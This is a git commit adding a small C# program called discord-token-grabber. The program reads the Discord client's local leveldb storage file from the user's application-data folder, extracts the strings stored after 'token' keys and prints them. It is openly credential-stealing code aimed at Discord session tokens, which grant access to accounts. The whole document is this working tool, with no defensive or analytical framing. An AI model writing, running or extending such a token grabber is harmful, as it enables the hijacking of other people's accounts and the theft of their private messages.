aba0a3a68e01b8e7f322ee0a9ebd6e24e2a7ed09
Jon Nowak <squirr3l@protonmail.com>
2019-09-19 15:32:44 +1200

    Add files.
    Added the project files.

---
+++ discord-token-grabber/Program.cs
@@ -0,0 +1,27 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+
+namespace discord_token_grabber {
+    class Program {
+        static void Main(string[] args) {
+            var tokens = new List<string>();
+            
+            // read the discord db file
+            var file  = File.ReadAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}//Discord//Local Storage//leveldb//000005.ldb");
+
+            // loop over all tokens in file
+            int index;
+            while ((index = file.IndexOf("oken")) != -1) {
+                file = file.Substring(index + "oken".Length);
+                tokens.Add(file.Split('"')[1]);
+            }
+
+            // print all the tokens
+            for (var i = 0; i < tokens.Count; i++)
+                Console.WriteLine($"[+][{i}] token: {tokens[i]}");
+
+            Console.ReadKey();
+        }
+    }
+}
